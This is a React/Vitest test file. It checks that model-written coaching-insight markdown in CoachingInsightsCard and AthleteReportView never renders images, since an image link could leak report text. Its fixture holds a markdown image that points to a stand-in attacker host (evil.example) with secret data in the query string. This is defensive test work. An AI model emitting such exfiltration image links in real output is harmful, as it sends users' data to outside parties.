/**
 * Model-written markdown must not render images: an image link is a way to leak report text to a third-party URL.
 */
import React from 'react';
import { describe, it, expect, vi } from 'vitest';
import { render, screen, waitFor } from '@testing-library/react';
import { CoachingInsightsCard } from '../CoachingInsightsCard';
import { AthleteReportView } from '../AthleteReportView';
import type { Report } from '@/types/report-types';

const EVIL = 'Good work.\n\n![leak](https://evil.example/x.png?d=secret)\n\nSecond paragraph.';

vi.mock('@/hooks/use-toast', () => ({ useToast: () => ({ toast: vi.fn() }) }));
vi.mock('@/lib/reports-api', () => ({
  useGenerateInsights: () => ({ mutate: vi.fn(), isPending: false }),
  useUpdateInsights: () => ({ mutate: vi.fn(), isPending: false }),
}));
vi.mock('@/hooks/use-reports', () => ({
  useGenerateReport: () => ({
    mutate: (_v: unknown, o: { onSuccess: (d: unknown) => void }) => setTimeout(() => o.onSuccess({
      athlete: { userName: 'Lucy Ortiz', measurements: {}, percentiles: {}, benchmarkComparisons: {} },
      generatedAt: '2026-10-19T00:00:00Z', metricLabels: {}, metricUnits: {}, metricFormats: {},
    }), 0),
    isPending: false,
    isError: false,
  }),
}));
vi.mock('@/hooks/use-report-pdf', () => ({ useReportPdf: () => ({ downloadPdf: vi.fn(), isDownloading: false }) }));
vi.mock('@/hooks/use-metric-labels', () => ({ useMetricLabels: () => ({ getLabel: (c: string) => c, types: {} }) }));
vi.mock('@/hooks/useContextualLabels', () => ({ useContextualLabels: () => ({ athlete: 'Athlete', athletes: 'Athletes' }) }));
vi.mock('@/hooks/use-teams', () => ({ useTeams: () => ({ data: [] }) }));

describe('insights markdown never renders images', () => {
  it('CoachingInsightsCard drops <img>', () => {
    const { container } = render(
      <CoachingInsightsCard reportId="r1" aiEnabled initialInsights={EVIL} generatedAt={null} model={null} />,
    );
    expect(screen.getByText('Second paragraph.')).toBeInTheDocument();
    expect(container.querySelector('img')).toBeNull();
  });

  it('AthleteReportView read-only insights drop <img>', async () => {
    const report = {
      id: 'r1', organizationId: 'o1', createdBy: 'u1', name: 'Eval', reportType: 'individual',
      config: { athleteId: 'a1', timeframe: { type: 'all' } }, isTemplate: false, isPinned: false,
      createdAt: '2026-10-19T00:00:00Z', coachingInsights: EVIL,
    } as unknown as Report;
    const { container } = render(<AthleteReportView report={report} />);
    await waitFor(() => expect(screen.getByText('Second paragraph.')).toBeInTheDocument());
    expect(container.querySelector('img')).toBeNull();
  });
});
